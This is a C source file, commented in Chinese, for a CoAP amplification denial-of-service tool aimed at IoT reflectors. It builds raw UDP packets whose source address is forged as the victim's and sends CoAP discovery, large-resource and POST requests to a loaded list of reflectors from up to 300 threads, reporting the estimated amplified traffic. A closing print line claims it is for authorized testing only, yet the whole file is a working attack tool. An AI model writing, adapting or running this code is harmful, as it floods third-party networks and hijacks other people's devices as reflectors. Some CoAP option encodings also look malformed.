/*
 * CoAP (Constrained Application Protocol) 放大攻击
 * 针对IoT设备的新兴攻击向量
 * 放大倍数: 10-40倍
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define MAX_PACKET_SIZE 8192
#define MAX_THREADS 300
#define COAP_PORT 5683
#define COAP_SECURE_PORT 5684

struct attack_config {
    char target_ip[256];
    int target_port;
    char reflector_file[256];
    int duration;
    int threads;
    volatile int running;
    volatile long packets_sent;
    volatile long bytes_sent;
};

struct reflector {
    struct sockaddr_in addr;
    struct reflector *next;
};

struct thread_data {
    struct attack_config *config;
    struct reflector *reflector_list;
    int thread_id;
};

// CoAP消息头结构
struct coap_header {
    unsigned char ver_type_tkl;  // 版本(2位) + 类型(2位) + Token长度(4位)
    unsigned char code;          // 消息代码
    unsigned short message_id;   // 消息ID
};

// CoAP选项结构
struct coap_option {
    unsigned char delta_length;  // 选项增量(4位) + 长度(4位)
    unsigned char value[];       // 选项值
};

// 创建CoAP GET请求 (/.well-known/core)
int create_coap_discovery_request(char *buffer) {
    struct coap_header *header = (struct coap_header *)buffer;
    char *payload = buffer + sizeof(struct coap_header);
    int offset = 0;
    
    // CoAP头部
    header->ver_type_tkl = 0x40;  // 版本1, CON类型, Token长度0
    header->code = 0x01;          // GET请求
    header->message_id = htons(rand() % 65535);
    
    // Uri-Path选项: .well-known
    payload[offset++] = 0xB4;  // 选项11 (Uri-Path), 长度4
    memcpy(payload + offset, ".well-known", 11);
    offset += 11;
    
    // Uri-Path选项: core
    payload[offset++] = 0x04;  // 选项增量0, 长度4
    memcpy(payload + offset, "core", 4);
    offset += 4;
    
    return sizeof(struct coap_header) + offset;
}

// 创建CoAP GET请求 (/large) - 请求大资源
int create_coap_large_request(char *buffer) {
    struct coap_header *header = (struct coap_header *)buffer;
    char *payload = buffer + sizeof(struct coap_header);
    int offset = 0;
    
    // CoAP头部
    header->ver_type_tkl = 0x40;  // 版本1, CON类型, Token长度0
    header->code = 0x01;          // GET请求
    header->message_id = htons(rand() % 65535);
    
    // Uri-Path选项: large
    payload[offset++] = 0xB5;  // 选项11 (Uri-Path), 长度5
    memcpy(payload + offset, "large", 5);
    offset += 5;
    
    // Accept选项: application/link-format
    payload[offset++] = 0x60;  // 选项17 (Accept), 长度0
    payload[offset++] = 40;    // application/link-format
    
    return sizeof(struct coap_header) + offset;
}

// 创建CoAP POST请求 - 可能触发更大响应
int create_coap_post_request(char *buffer) {
    struct coap_header *header = (struct coap_header *)buffer;
    char *payload = buffer + sizeof(struct coap_header);
    int offset = 0;
    
    // CoAP头部
    header->ver_type_tkl = 0x41;  // 版本1, CON类型, Token长度1
    header->code = 0x02;          // POST请求
    header->message_id = htons(rand() % 65535);
    
    // Token
    payload[offset++] = 0xAB;
    
    // Uri-Path选项: test
    payload[offset++] = 0xB4;  // 选项11 (Uri-Path), 长度4
    memcpy(payload + offset, "test", 4);
    offset += 4;
    
    // Content-Format选项: text/plain
    payload[offset++] = 0xC0;  // 选项12 (Content-Format), 长度0
    payload[offset++] = 0;     // text/plain
    
    // Payload marker
    payload[offset++] = 0xFF;
    
    // Payload data
    memcpy(payload + offset, "amplification_test_data", 23);
    offset += 23;
    
    return sizeof(struct coap_header) + offset;
}

// 创建伪造的UDP包
int create_spoofed_udp_packet(char *packet, const char *src_ip, const char *dst_ip, 
                             int src_port, int dst_port, const char *payload, int payload_len) {
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char *data;
    
    // IP头部
    ip_header = (struct iphdr *)packet;
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
    ip_header->id = htons(rand() % 65535);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->check = 0;
    inet_pton(AF_INET, src_ip, &ip_header->saddr);
    inet_pton(AF_INET, dst_ip, &ip_header->daddr);
    
    // UDP头部
    udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    udp_header->source = htons(src_port);
    udp_header->dest = htons(dst_port);
    udp_header->len = htons(sizeof(struct udphdr) + payload_len);
    udp_header->check = 0;
    
    // 数据部分
    data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    memcpy(data, payload, payload_len);
    
    return sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
}

// 加载CoAP反射器列表
struct reflector *load_reflectors(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("❌ 无法打开反射器文件: %s\n", filename);
        return NULL;
    }
    
    struct reflector *head = NULL;
    struct reflector *current = NULL;
    char line[256];
    int count = 0;
    
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = 0;
        
        if (strlen(line) == 0 || line[0] == '#') {
            continue;
        }
        
        struct reflector *new_reflector = malloc(sizeof(struct reflector));
        if (!new_reflector) {
            continue;
        }
        
        memset(&new_reflector->addr, 0, sizeof(new_reflector->addr));
        new_reflector->addr.sin_family = AF_INET;
        new_reflector->addr.sin_port = htons(COAP_PORT);
        
        if (inet_pton(AF_INET, line, &new_reflector->addr.sin_addr) <= 0) {
            free(new_reflector);
            continue;
        }
        
        new_reflector->next = NULL;
        
        if (head == NULL) {
            head = new_reflector;
            current = new_reflector;
        } else {
            current->next = new_reflector;
            current = new_reflector;
        }
        
        count++;
    }
    
    fclose(file);
    printf("✅ 加载了 %d 个CoAP反射器\n", count);
    return head;
}

void *attack_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct attack_config *config = data->config;
    struct reflector *reflector_list = data->reflector_list;
    
    int sock;
    char packet[MAX_PACKET_SIZE];
    char coap_requests[3][256];
    int coap_lens[3];
    
    // 创建原始socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        printf("❌ 线程 %d: 无法创建原始socket (需要root权限)\n", data->thread_id);
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("❌ 线程 %d: 设置IP_HDRINCL失败\n", data->thread_id);
        close(sock);
        return NULL;
    }
    
    // 创建不同类型的CoAP请求
    coap_lens[0] = create_coap_discovery_request(coap_requests[0]);
    coap_lens[1] = create_coap_large_request(coap_requests[1]);
    coap_lens[2] = create_coap_post_request(coap_requests[2]);
    
    printf("✅ 线程 %d: 开始CoAP放大攻击\n", data->thread_id);
    
    struct reflector *current_reflector = reflector_list;
    int request_type = 0;
    
    while (config->running) {
        if (!current_reflector) {
            current_reflector = reflector_list;
            if (!current_reflector) break;
        }
        
        // 轮换不同的请求类型
        request_type = (request_type + 1) % 3;
        
        // 创建伪造的UDP包
        int packet_len = create_spoofed_udp_packet(
            packet,
            config->target_ip,  // 伪造源IP为目标IP
            inet_ntoa(current_reflector->addr.sin_addr),
            rand() % 65535 + 1024,  // 随机源端口
            COAP_PORT,
            coap_requests[request_type],
            coap_lens[request_type]
        );
        
        // 发送伪造包
        if (sendto(sock, packet, packet_len, 0, 
                  (struct sockaddr *)&current_reflector->addr, 
                  sizeof(current_reflector->addr)) > 0) {
            config->packets_sent++;
            config->bytes_sent += packet_len;
        }
        
        current_reflector = current_reflector->next;
        
        // 控制发送频率
        usleep(500); // 500微秒延迟
    }
    
    close(sock);
    printf("✅ 线程 %d: CoAP攻击结束\n", data->thread_id);
    return NULL;
}

void print_stats(struct attack_config *config) {
    time_t start_time = time(NULL);
    
    while (config->running) {
        sleep(5);
        time_t elapsed = time(NULL) - start_time;
        
        printf("\n=== CoAP放大攻击统计 ===\n");
        printf("目标: %s:%d\n", config->target_ip, config->target_port);
        printf("运行时间: %ld秒\n", elapsed);
        printf("发送包数: %ld\n", config->packets_sent);
        printf("发送字节: %ld (%.2f MB)\n", config->bytes_sent, config->bytes_sent / 1024.0 / 1024.0);
        printf("平均PPS: %ld\n", elapsed > 0 ? config->packets_sent / elapsed : 0);
        printf("预估放大流量: %.2f MB (按25倍计算)\n", config->bytes_sent * 25 / 1024.0 / 1024.0);
        printf("活跃线程: %d\n", config->threads);
        printf("=======================\n");
    }
}

void signal_handler(int sig) {
    printf("\n收到停止信号，正在清理...\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("CoAP放大攻击工具 (IoT设备攻击)\n");
        printf("使用方法: %s <目标IP> <端口> <反射器文件> <线程数> <持续时间>\n", argv[0]);
        printf("示例: %s 192.168.1.100 80 coap_reflectors.txt 30 300\n", argv[0]);
        printf("\n⚠️  注意: 需要root权限运行\n");
        printf("⚠️  针对IoT设备的新兴攻击向量\n");
        return 1;
    }
    
    if (getuid() != 0) {
        printf("❌ 需要root权限运行此程序\n");
        return 1;
    }
    
    struct attack_config config;
    strcpy(config.target_ip, argv[1]);
    config.target_port = atoi(argv[2]);
    strcpy(config.reflector_file, argv[3]);
    config.threads = atoi(argv[4]);
    config.duration = atoi(argv[5]);
    config.running = 1;
    config.packets_sent = 0;
    config.bytes_sent = 0;
    
    if (config.threads > MAX_THREADS) {
        config.threads = MAX_THREADS;
    }
    
    printf("🚀 启动CoAP放大攻击\n");
    printf("目标: %s:%d\n", config.target_ip, config.target_port);
    printf("反射器文件: %s\n", config.reflector_file);
    printf("线程数: %d\n", config.threads);
    printf("持续时间: %d秒\n", config.duration);
    printf("预期放大倍数: 10-40倍\n");
    printf("⚠️  仅用于授权测试！\n\n");
    
    // 加载反射器列表
    struct reflector *reflector_list = load_reflectors(config.reflector_file);
    if (!reflector_list) {
        printf("❌ 无法加载反射器列表\n");
        return 1;
    }
    
    // 设置信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // 创建攻击线程
    pthread_t threads[MAX_THREADS];
    struct thread_data thread_data[MAX_THREADS];
    
    for (int i = 0; i < config.threads; i++) {
        thread_data[i].config = &config;
        thread_data[i].reflector_list = reflector_list;
        thread_data[i].thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]);
        usleep(20000); // 20ms间隔启动线程
    }
    
    // 启动统计线程
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, (void *)print_stats, &config);
    
    // 等待指定时间
    sleep(config.duration);
    
    // 停止攻击
    config.running = 0;
    printf("\n⏰ 攻击时间结束，正在停止所有线程...\n");
    
    // 等待所有线程结束
    for (int i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n✅ CoAP放大攻击完成\n");
    printf("最终统计:\n");
    printf("- 发送包数: %ld\n", config.packets_sent);
    printf("- 发送字节: %ld\n", config.bytes_sent);
    printf("- 预估放大效果: %ld字节 (%.2f GB)\n", 
           config.bytes_sent * 25, config.bytes_sent * 25 / 1024.0 / 1024.0 / 1024.0);
    
    return 0;
}
